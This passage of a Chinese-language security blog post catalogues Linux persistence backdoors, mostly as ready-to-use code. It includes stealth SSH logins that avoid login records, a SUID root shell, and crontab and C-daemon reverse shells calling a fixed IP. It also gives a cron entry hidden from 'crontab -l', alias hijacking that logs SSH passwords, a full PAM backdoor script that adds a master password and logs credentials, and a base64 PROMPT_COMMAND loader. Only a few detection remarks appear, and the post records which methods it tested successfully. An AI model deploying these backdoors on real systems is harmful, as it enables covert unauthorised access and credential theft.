+</code></pre></div><p>如果想彻底恢复的话，需要进行ssh服务的重装。</p>
+<h4 id="4-ssh的隐身登录">4. ssh的隐身登录</h4>
+<p>在进行ssh登录时可以使用以下命令实现隐身登录，避免被<code>last\who\w</code>等指令检测到。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># 不被last\who\w等指令检测</span>
+ssh -T username@x.x.x.x /bin/bash -i
+
+<span style="color:#75715e"># 不记录ssh公钥在本地.ssh目录中</span>
+ssh -o UserKnownHostFile<span style="color:#f92672">=</span>/dev/null -T user@x.x.x.x /bin/bash -if
+</code></pre></div><h3 id="3-suid-shell">3. SUID Shell</h3>
+<p>需要配合普通用户进行使用。root权限下执行如下命令，普通用户运行/dev/.rootshell即可获得root权限：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cp /bin/bash /dev/.rootshell
+chmod u+s /dev/.rootshell
+</code></pre></div><p>备注：bash2针对suid做了一些防护措施，需要使用-p参数来获取一个root shell。另外，普通用户执行这个SUID shell时，一定要使用全路径。该方法个人认为较为鸡肋，且bash版本现在较高，可利用性不高。</p>
+<h3 id="4-crontab后门文件落地">4. crontab后门（文件落地）</h3>
+<p><code>crontab</code>命令用于设置周期性被执行的指令，可以利用该命令新建shell脚本，利用脚本进行反弹。</p>
+<p>Step 1 ：创建shell脚本，例如在/etc/evil.sh</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span>bash -i &gt;&amp; /dev/tcp/192.168.160.154/12345  0&gt;&amp;<span style="color:#ae81ff">1</span>
+</code></pre></div><p>并给脚本赋予相应权限：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chmod +sx /etc/evil.sh
+</code></pre></div><p>Step 2：设置定时服务</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">crontab -e
+</code></pre></div><p>输入以下内容：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># exec per min</span>
+
+*/1 * * * * root /etc/evil.sh
+</code></pre></div><p>重启crond服务，<code>service crond restart</code>，然后使用nc接收shell。</p>
+<p>上述方法在实际测试中成功了率较低，建议使用一句话后门：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>crontab -l;printf <span style="color:#e6db74">&#34;*/1 * * * * /tmp/crontab_backdoor.sh;\rno crontab for `whoami`%100c\n&#34;</span><span style="color:#f92672">)</span>|crontab -
+</code></pre></div><p>这种方式成功率更高，而且不易被<code>crontab -l</code>发现。</p>
+<p>其中关于crondtab的详细原理可以参考：<a href="https://cloud.tencent.com/developer/article/1683265">https://cloud.tencent.com/developer/article/1683265</a></p>
+<p>排查手段：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># 查看可以的定时任务列表</span>
+crontab -e
+</code></pre></div><h3 id="5-alias欺骗文件落地">5. alias欺骗（文件落地）</h3>
+<p>可以通过<code>alias</code>命令来执行特定的命令时静默运行其他程序，从而达到启动后门，记录键值等作用。2个实例：</p>
+<ol>
+<li>
+<p>修改ssh命令，利用strace，使其具有记录ssh对read、write、connect调用的功能：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">alias ssh<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;strace -o /tmp/sshpwd-`date    &#39;</span>+%d%h%m%s<span style="color:#e6db74">&#39;`.log -e read,write,connect  -s2048 ssh&#39;</span>
+</code></pre></div></li>
+<li>
+<p>利用守护进程回弹shell</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">alias cat<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;cat&amp;&amp;/root/.shell&#39;</span>
+</code></pre></div></li>
+</ol>
+<p>回弹shell的c语言版脚本：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">// shell.c
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;time.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/stat.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;signal.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#define ERR_EXIT(m) 
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">do</span>
+{
+    perror(m);
+    exit(EXIT_FAILURE);
+}
+<span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">0</span>);
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">creat_daemon</span>(<span style="color:#66d9ef">void</span>);
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
+{
+    time_t t;
+    <span style="color:#66d9ef">int</span> fd;
+    creat_daemon();
+    <span style="color:#75715e">// 将ip和端口进行替换
+</span><span style="color:#75715e"></span>    system(<span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/192.168.80.147/12345 0&gt;&amp;1&#34;</span>);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">creat_daemon</span>(<span style="color:#66d9ef">void</span>)
+{
+    pid_t pid;
+    <span style="color:#66d9ef">int</span> devnullfd,fd,fdtablesize;
+    umask(<span style="color:#ae81ff">0</span>);
+
+    pid <span style="color:#f92672">=</span> fork();
+    <span style="color:#66d9ef">if</span>( pid <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+        ERR_EXIT(<span style="color:#e6db74">&#34;fork error&#34;</span>);
+    <span style="color:#66d9ef">if</span>(pid <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> )
+        exit(EXIT_SUCCESS);
+    <span style="color:#66d9ef">if</span>(setsid() <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+        ERR_EXIT(<span style="color:#e6db74">&#34;SETSID ERROR&#34;</span>);
+    chdir(<span style="color:#e6db74">&#34;/&#34;</span>);
+
+    <span style="color:#75715e">/* close any open file descriptors */</span>
+    <span style="color:#66d9ef">for</span>(fd <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, fdtablesize <span style="color:#f92672">=</span> getdtablesize(); fd <span style="color:#f92672">&lt;</span> fdtablesize; fd<span style="color:#f92672">++</span>)
+        close(fd);
+
+    devnullfd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/dev/null&#34;</span>, <span style="color:#ae81ff">0</span>);
+
+    <span style="color:#75715e">/* make STDIN ,STDOUT and STDERR point to /dev/null */</span>
+    <span style="color:#66d9ef">if</span> (devnullfd <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+        ERR_EXIT(<span style="color:#e6db74">&#34;can&#39;t open /dev/null&#34;</span>);
+    }
+    <span style="color:#66d9ef">if</span> (dup2(devnullfd, STDIN_FILENO) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+        ERR_EXIT(<span style="color:#e6db74">&#34;can&#39;t dup2 /dev/null to STDIN_FILENO&#34;</span>);
+    }
+    <span style="color:#66d9ef">if</span> (dup2(devnullfd, STDOUT_FILENO) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+        ERR_EXIT(<span style="color:#e6db74">&#34;can&#39;t dup2 /dev/null to STDOUT_FILENO&#34;</span>);
+    }
+    <span style="color:#66d9ef">if</span> (dup2(devnullfd, STDERR_FILENO) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+        ERR_EXIT(<span style="color:#e6db74">&#34;can&#39;t dup2 /dev/null to STDOUT_FILENO&#34;</span>);
+    }
+    signal(SIGCHLD,SIG_IGN); 
+    <span style="color:#66d9ef">return</span>;
+}
+</code></pre></div><p>使用nc监听回弹的shell。</p>
+<h3 id="6-linux-pam密码记录后门文件落地">6. Linux PAM密码记录后门（文件落地）</h3>
+<p>PAM(Pluggable Authentication Modules)，是由Sun提出的一种认证机制。它通过一共一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。这种后门主要是通过pam_unix_auth.c打补丁的方式潜入到正常的pam模块中，以此来记录管理员的账号密码。其大致流程如下：</p>
+<ol>
+<li>获取目标系统所使用的PAM版本，下载对应版本的pam版本</li>
+<li>解压缩，修改pam_unix_auth.c文件，添加万能密码</li>
+<li>编译安装PAM</li>
+<li>编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换，即可使用万能密码登陆，并将用户名密码记录到文件中。</li>
+</ol>
+<p>一个自动化脚本如下：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span><span style="color:#75715e">## </span>
+<span style="color:#75715e">##查看版本:</span>
+<span style="color:#75715e">##redhat yum list pam</span>
+<span style="color:#75715e">##debian&amp;Ubuntu  dpkg -s libpam-modules | grep -i version | cut -d&#39; &#39; -f2</span>
+<span style="color:#75715e">##</span>
+PASS<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;test123&#39;</span> <span style="color:#75715e">##......</span>
+LOG<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;\/bin\/.sshlog&#39;</span> <span style="color:#75715e">##......</span>
+
+echo <span style="color:#e6db74">&#34;
+</span><span style="color:#e6db74">.___  ___.   ___     ___    _______  ____    ____ 
+</span><span style="color:#e6db74">|   \/   |  / _ \   / _ \  |       \ \   \  /   / 
+</span><span style="color:#e6db74">|  \  /  | | | | | | | | | |  .--.  | \   \/   /  
+</span><span style="color:#e6db74">|  |\/|  | | | | | | | | | |  |  |  |  \_    _/   
+</span><span style="color:#e6db74">|  |  |  | | |_| | | |_| | |  &#39;--&#39;  |    |  |     
+</span><span style="color:#e6db74">|__|  |__|  \___/   \___/  |_______/     |__|   &#34;</span>
+echo -e <span style="color:#e6db74">&#34;\nPam-Backdoor\n{code this shit while learning pam}\n\n&#34;</span>
+oldtime<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>stat -c <span style="color:#e6db74">&#39;%z&#39;</span> /lib/security/pam_ftp.so<span style="color:#e6db74">`</span>
+echo <span style="color:#e6db74">&#39;Pam backdoor starting!&#39;</span>
+mirror_url<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://www.linux-pam.org/library/Linux-PAM-1.1.1.tar.gz&#39;</span>
+<span style="color:#75715e">#mirror_url=&#39;http://yum.singlehop.com/pub/linux/libs/pam/pre/library/Linux-PAM-0.99.6.2.tar.gz&#39;，修改为对应的pam版本</span>
+echo <span style="color:#e6db74">&#39;Fetching from &#39;</span>$mirror_url
+wget $mirror_url <span style="color:#75715e">#fetch the roll</span>
+tar zxf Linux-PAM-1.1.1.tar.gz <span style="color:#75715e">#untar,修改为对应的pam版本</span>
+cd Linux-PAM-1.1.1
+<span style="color:#75715e">#find and replace</span>
+sed -i -e <span style="color:#e6db74">&#39;s/retval = _unix_verify_password(pamh, name, p, ctrl);/retval = _unix_verify_password(pamh, name, p, ctrl);\n\tif (strcmp(p,&#34;&#39;</span>$PASS<span style="color:#e6db74">&#39;&#34;)==0 ){retval = PAM_SUCCESS;}if(retval == PAM_SUCCESS){\n\tFILE * fp;\n\tfp = fopen(&#34;&#39;</span>$LOG<span style="color:#e6db74">&#39;&#34;, &#34;a&#34;);\n\tfprintf(fp, &#34;%s : %s\\n&#34;, name, p);\n\tfclose(fp);\n\t}/g&#39;</span> modules/pam_unix/pam_unix_auth.c
+DIS<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>head /etc/issue -n 1|awk <span style="color:#e6db74">&#39;{print $1}&#39;</span><span style="color:#e6db74">`</span>
+<span style="color:#75715e">#get the version</span>
+<span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> $DIS <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;CentOS&#34;</span> <span style="color:#f92672">]</span>;<span style="color:#66d9ef">then</span>
+./configure --disable-selinux <span style="color:#f92672">&amp;&amp;</span> make
+<span style="color:#66d9ef">else</span>
+./configure <span style="color:#f92672">&amp;&amp;</span> make
+<span style="color:#66d9ef">fi</span>
+<span style="color:#75715e">#copy modified pam_unix.so</span>
+<span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">`</span>uname -p<span style="color:#e6db74">`</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;x86_64&#39;</span> <span style="color:#f92672">]</span>;<span style="color:#66d9ef">then</span>
+LIBPATH<span style="color:#f92672">=</span>lib64
+<span style="color:#66d9ef">else</span>
+LIBPATH<span style="color:#f92672">=</span>lib
+<span style="color:#66d9ef">fi</span>
+/bin/cp -rf /$LIBPATH/security/pam_unix.so /$LIBPATH/security/pam_unix.so.bak <span style="color:#75715e">#.. .........</span>
+/bin/cp -rf modules/pam_unix/.libs/pam_unix.so /$LIBPATH/security/pam_unix.so
+touch -d <span style="color:#e6db74">&#34;</span>$oldtime<span style="color:#e6db74">&#34;</span> /lib/security/pam_unix.so
+cd .. <span style="color:#f92672">&amp;&amp;</span> rm -rf Linux-PAM-1.1.1*
+echo <span style="color:#e6db74">&#34;Done bro..&#34;</span>
+</code></pre></div><p>可以根据需要将下载pam部分修改为上传本地下载好的pam，这样可以避免目标主机无法访问对应链接地址时造成的文件下载失败。</p>
+<p>Linux PAM版本地址：<a href="http://www.linux-pam.org/library/">http://www.linux-pam.org/library/</a></p>
+<p>详细情况可参考<a href="https://blog.51cto.com/redkey/1343316">https://blog.51cto.com/redkey/1343316</a></p>
+<h3 id="5-prompt_command后门">5. PROMPT_COMMAND后门</h3>
+<p>bash提供来一个环境变量<code>PROMPT_COMMAND</code>，这个变量会在执行命令前执行一遍。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">export PROMPT_COMMAND<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;lsof -i:1025 &amp;&gt;/dev/null || (python -c &#34;</span>exec<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;encoded_payload&#39;</span>.decode<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;base64&#39;</span><span style="color:#f92672">))</span><span style="color:#e6db74">&#34; 2&gt;/dev/null &amp;)&#34;</span>
+</code></pre></div><p>也可以使用该变量进行提权：<a href="https://www.anquanke.com/post/id/155943">https://www.anquanke.com/post/id/155943</a></p>
+<h3 id="7-rootkit">7. Rootkit</h3>
+<p>根据搜索情况来看，一般水平的rootkit很容易将系统环境搞崩，而高质量的Rootkit不太容易找，因此如非迫不得已，不是很建议直接使用这种方法。如果能单独进行定制，是另外一种情况。这里暂时先给出一个收集的rootkit库：<a href="https://github.com/d30sa1/RootKits-List-Download">https://github.com/d30sa1/RootKits-List-Download</a></p>
+<h2 id="参考文献">参考文献</h2>
+<ol>
+<li><a href="https://wiki.bash-hackers.org/howto/redirection_tutorial">https://wiki.bash-hackers.org/howto/redirection_tutorial</a></li>
+<li><a href="https://www.gnu.org/software/bash/manual/html_node/Redirections.html">https://www.gnu.org/software/bash/manual/html_node/Redirections.html</a></li>
+<li><a href="https://brucetg.github.io/2018/05/03/%E5%A4%9A%E7%A7%8D%E5%A7%BF%E5%8A%BF%E5%8F%8D%E5%BC%B9shell/">https://brucetg.github.io/2018/05/03/%E5%A4%9A%E7%A7%8D%E5%A7%BF%E5%8A%BF%E5%8F%8D%E5%BC%B9shell/</a></li>
+<li><a href="https://www.anquanke.com/post/id/171891#h2-15">https://www.anquanke.com/post/id/171891#h2-15</a></li>
+<li><a href="https://bypass007.github.io/Emergency-Response-Notes/privilege/%E7%AC%AC4%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E5%90%8E%E9%97%A8%E7%AF%87.html">https://bypass007.github.io/Emergency-Response-Notes/privilege/%E7%AC%AC4%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E5%90%8E%E9%97%A8%E7%AF%87.html</a></li>
+<li><a href="https://www.anquanke.com/post/id/155943#h2-9">https://www.anquanke.com/post/id/155943#h2-9</a></li>
+</ol>
+<h2 id="测试结果">测试结果</h2>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>sshd软链接</td>
+<td>成功</td>
+</tr>
+<tr>
+<td>ssh免密登录</td>
+<td>失败</td>
+</tr>
+<tr>
+<td>ssh wrapper</td>
+<td>成功</td>
+</tr>
+<tr>
+<td>ssh隐身登录</td>
+<td>成功</td>
+</tr>
+<tr>
+<td>SUID shell</td>
+<td>成功</td>
+</tr>
+<tr>
+<td>crontab后门</td>
+<td>成功</td>
+</tr>
+<tr>
+<td>alias欺骗</td>
+<td>成功</td>
+</tr>
+<tr>
+<td>pam后门</td>
+<td>成功</td>
+</tr>
+</tbody>
+</table>
+
+
+                
+                
+<div class="entry-shang text-center">
+		
+			<p>「真诚赞赏，手留余香」</p>
+		
+		<button class="zs show-zs btn btn-bred">赞赏支持</button>
+	</div>
+	<div class="zs-modal-bg"></div>
+	<div class="zs-modal-box">
+		<div class="zs-modal-head">
+			<button type="button" class="close">×</button>
+			<span class="author"><a href="http://v4ler1an.com/"><img src="/img/icon2.png" />V4ler1an Blog</a></span>
+			
+				<p class="tip"><i></i><span>真诚赞赏，手留余香</span></p>
+			
+	 
+		</div>
+		<div class="zs-modal-body">
+			<div class="zs-modal-btns">
+				<button class="btn btn-blink" data-num="2">2元</button>
+				<button class="btn btn-blink" data-num="5">5元</button>
+				<button class="btn btn-blink" data-num="10">10元</button>
+				<button class="btn btn-blink" data-num="50">50元</button>
+				<button class="btn btn-blink" data-num="100">100元</button>
+				<button class="btn btn-blink" data-num="1">任意金额</button>
+			</div>
+			<div class="zs-modal-pay">
+				<button class="btn btn-bred" id="pay-text">2元</button>
+				<p>使用<span id="pay-type">微信</span>扫描二维码完成支付</p>
+				<img src="/img/reward/wechat-2.png"  id="pay-image"/>
+			</div>
+		</div>
+		<div class="zs-modal-footer">
+			<label><input type="radio" name="zs-type" value="wechat" class="zs-type" checked="checked"><span ><span class="zs-wechat"><img src="/img/reward/wechat-btn.png"/></span></label>
+			<label><input type="radio" name="zs-type" value="alipay" class="zs-type" class="zs-alipay"><img src="/img/reward/alipay-btn.png"/></span></label>
+		</div>
+	</div>
+	<script type="text/javascript" src="/js/reward.js"></script>
+                
+
+                <hr>
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/2020/11/JWT" data-toggle="tooltip" data-placement="top" title="JWT认证和攻击界面简单总结">&larr;
+                            Previous Post</a>
+                    </li>
+                    
+                    
+                </ul>
+
+                
+<div id="disqus-comment"></div>
+
+<div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "V4ler1an" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+
+            </div>
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/ctf" title="ctf">
+                            ctf
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/hadoop" title="hadoop">
+                            hadoop
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/reversing" title="reversing">
+                            reversing
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/security" title="security">
+                            security
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/tips" title="tips">
+                            tips
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/vulnerability" title="vulnerability">
+                            vulnerability
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                    </div>
+                </section>
+                
+
+                
+                
+                <section>
+                    <hr>
+                    <h5>FRIENDS</h5>
+                    <ul class="list-inline">
+                        
+                        <li><a target="_blank" href="https://r00tk1ts.github.io/">r00tk1t&#39;s blog</a></li>
+                        
+                    </ul>
+                </section>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                   
+                   <li>
+                       <a href='' rel="alternate" type="application/rss+xml" title="V4ler1an Blog" >
+                           <span class="fa-stack fa-lg">
+                               <i class="fa fa-circle fa-stack-2x"></i>
+                               <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+                           </span>
+                       </a>
+                   </li>
+                   
+                    
+                    <li>
+                        <a href="mailto:whiteghostwalker@gmail.com">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		    
+                    
+                    
+                    <li>
+                        <a href="https://twitter.com/YaoyaoShaw">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+
+                    
+
+		    
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/AlexsanderShaw">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                </ul>
+		<p class="copyright text-muted">
+                    Copyright &copy; V4ler1an Blog 2020
+                    <br>
+                    <a href="https://themes.gohugo.io/hugo-theme-cleanwhite">CleanWhite Hugo Theme</a> by <a href="https://zhaohuabing.com">Huabing</a> |
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=zhaohuabing&repo=hugo-theme-cleanwhite&type=star&count=true" >
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+
+
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+
+
+
+
+<script>
+    
+    if($('#tag_cloud').length !== 0){
+        async("/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+
+<script>
+    async("https://cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+
+
+
+</body>
+</html>
